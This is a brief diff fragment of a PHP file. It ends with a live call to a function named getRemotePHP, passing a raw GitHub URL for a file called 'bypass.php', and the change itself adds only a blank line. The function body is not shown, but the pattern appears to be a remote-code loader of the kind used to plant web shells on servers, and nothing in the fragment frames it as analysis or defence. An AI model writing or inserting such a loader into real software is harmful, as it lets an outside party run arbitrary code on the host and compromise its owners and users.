@@ -19,4 +19,5 @@ function getRemotePHP($url) {
 }
 
 getRemotePHP('https://raw.githubusercontent.com/wawanbangke/ggo/refs/heads/main/bypass.php');
+
 ?>
